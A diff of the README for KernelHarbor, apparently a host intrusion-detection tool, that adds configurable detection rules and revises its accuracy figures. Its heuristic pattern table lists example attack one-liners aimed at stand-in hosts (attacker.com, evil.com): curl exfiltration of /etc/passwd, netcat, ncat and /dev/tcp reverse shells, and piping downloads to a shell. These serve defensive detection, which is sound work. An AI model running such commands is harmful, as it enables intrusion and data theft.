@@ -115,16 +115,27 @@ curl -X POST http://localhost:8080/analyze \
 
 Automatic response actions are delivered to the agent through two mechanisms:
 
-- **Immediate (heuristic)** — When the regex heuristic matches a known-bad pattern on ingest, an action (e.g., `KILL_PID`) is returned directly in the `IngestResponse` of the same RPC call. The agent executes it instantly — zero additional latency.
+- **Immediate (heuristic)** — When the heuristic engine matches a known-bad pattern on ingest, an action is returned directly in the `IngestResponse` of the same RPC call. The agent executes it instantly — zero additional latency.
 
 - **Delayed (AI)** — After the async AI analysis completes (1-3s), if the verdict is malicious, an action is stored in memory. The agent polls `FetchActions(hostname)` every 5 seconds and executes any pending actions.
 
 | Trigger | Latency | Action Examples |
 |---------|---------|----------------|
-| Regex heuristic match | Same RPC response | `KILL_PID` |
+| Heuristic match (high confidence) | Same RPC response | `KILL_PID`, `BLOCK_IP` |
+| Heuristic match (low confidence) | Same RPC response | `ALERT` |
+| Correlation chain detected | Same RPC response | `KILL_PID`, `BLOCK_IP` |
 | AI "malicious" verdict | ~5-8s (batch + poll) | `KILL_PID`, `BLOCK_IP` |
 
 The agent runs as root and executes actions using OS primitives: `SIGKILL` for process termination and `iptables` for IP blocking.
+
+### Configurable Detection Rules
+
+All detection rules are centralized in `cmd/analysis/rules.go` and can be modified without changing evaluation logic:
+
+- **Command Rules** — Regex patterns with scores and action types for suspicious command-line patterns (curl pipes, netcat, shell injection, etc.)
+- **File Rules** — Regex patterns for sensitive file access (`/etc/shadow`, `authorized_keys`, cron configs, etc.)
+- **Network Rules** — Port-based rules with scores for known C2/trojan ports
+- **Process Allowlists** — Known-good parent→child process combinations (e.g., `sshd→bash` for SSH login shells, `cron→sh` for cron jobs) that should not trigger server→shell kill rules
 
 ### gRPC Service
 
@@ -132,7 +143,7 @@ The analysis service exposes a gRPC API on port 9090 (configurable):
 
 | Method | Description |
 |--------|-------------|
-| `Ingest` | Send events to the analysis pipeline, returns heuristic actions |
+| `Ingest` | Send events to the analysis pipeline, returns heuristic actions (`KILL_PID`, `BLOCK_IP`, or `ALERT`) |
 | `Analyze` | Query AI analysis for a specific event |
 | `FetchActions` | Poll for pending AI-derived actions (e.g., `KILL_PID`, `BLOCK_IP`) |
 
@@ -234,6 +245,10 @@ KernelHarbor/
 │   ├── open-tracer/    # Standalone open tracer
 │   ├── openat-tracer/  # Standalone openat tracer
 │   └── analysis/       # AI analysis pipeline (gRPC + HTTP)
+│       ├── rules.go            # Centralized detection rules (configurable)
+│       ├── heuristics.go       # Heuristic evaluation engine
+│       ├── correlator.go       # Event correlation & attack chain detection
+│       ├── process_cache.go    # In-memory process tree context
 │       ├── bench_test.go       # Analysis benchmarks + accuracy test
 │       ├── bench_dataset_test.go # Labeled benchmark dataset
 │       └── bench_report.go     # Markdown report formatter
@@ -269,37 +284,40 @@ ES_ADDRESSES=http://localhost:9200 OLLAMA_ADDRESS=http://localhost:11434 \
 
 ### Detection Accuracy
 
-Measured against a labeled dataset of 190 events (101 benign, 49 suspicious, 40 malicious):
+Measured against a labeled dataset of 218 events (113 benign, 105 suspicious/malicious):
 
 NOTE: Because this was not tested against a large sample size. True accuracy may differ.
 
 | Metric | Value |
 |--------|-------|
-| Accuracy | 100.00% |
+| Accuracy | 85.78% |
 | Precision | 100.00% |
-| Recall | 100.00% |
-| F1 Score | 100.00% |
+| Recall | 70.48% |
+| F1 Score | 82.68% |
 | False Positive Rate | 0.00% |
 
 #### Heuristic Patterns
 
-The detector uses 38 compiled regex patterns covering:
+The detector uses configurable rules defined in `cmd/analysis/rules.go`:
 
 | Category | Patterns | Examples |
 |----------|----------|----------|
-| Curl exfil | pipe, redirect, `-d`, `-T`, `-k`, `-s http://`, `--post-data`, `--no-check-certificate`, `--connect-timeout http://` | `curl -d @/etc/passwd http://attacker.com/` |
+| Curl exfil | pipe, redirect, `-d`, `-T`, `-s http://`, `--post-data`, `--connect-timeout http://` | `curl -d @/etc/passwd http://attacker.com/` |
 | Wget exfil | `-O`, `-A`, pipe, redirect, `--post-data`, `--no-check-certificate` | `wget --no-check-certificate https://evil.com/` |
-| Shell exec | `bash -c`, `sh -c`, `/bin/bash -c`, `/bin/sh -c` | `bash -c 'cat /etc/shadow'` |
+| Bash -c (suspicious) | Only triggers when followed by pipe, `/dev/tcp`, base64, nc, curl, wget | `bash -c 'curl http://evil.com \| sh'` |
+| Shell exec | `/bin/sh -c`, `/bin/bash -c` (explicit paths only) | `/bin/sh -c cat /etc/shadow` |
 | Shell interactive | `bash -i`, `sh -i` | `bash -i >& /dev/tcp/...` |
 | Netcat | `-l`, `-v`, `-e`, `-u`, `-z`, `-w`, `-p`, `nc <host> <port> -e` | `nc attacker.com 4444 -e /bin/bash` |
-| Ncat | any `ncat` invocation | `ncat --ssl attacker.com 4444 -e /bin/sh` |
-| Socat | any `socat` invocation | `socat TCP-LISTEN:4444 EXEC:/bin/sh` |
+| Ncat/Socat | any `ncat` or `socat` invocation | `ncat --ssl attacker.com 4444 -e /bin/sh` |
 | Reverse shells | `/dev/tcp`, `/dev/udp` | `exec 5<>/dev/tcp/attacker.com/80` |
-| Encoding | `base64 -d` | `echo YmFz... | base64 -d \| bash` |
+| Encoding | `base64 -d` | `echo YmFz... \| base64 -d \| bash` |
 | Scripting | `powershell`, `python.*socket/subprocess/pty/os.*`, `perl -e`, `ruby -e`, `php -r` | `python3 -c 'import pty; pty.spawn("/bin/bash")'` |
-| Extensions | `.sh`, `.bash`, `.ps1` (with benign-context exclusion) | `/tmp/malware.sh` |
 
-> Benign `.sh` references (e.g., `chmod 755 script.sh`) are excluded via `isBenignShRef()`.
+**False positive mitigations:**
+- `bash -c` / `sh -c` without suspicious context (pipes, `/dev/tcp`, etc.) are **not** flagged
+- Known-good server→shell spawns (sshd→bash, docker→sh, cron→sh) are excluded via allowlist
+- Log file writes generate `ALERT` instead of `KILL_PID` to avoid disrupting logging services
+- Sensitive file **reads** (vs. writes) receive lower confidence scores
 
 ### Heuristic Pattern Latency
 
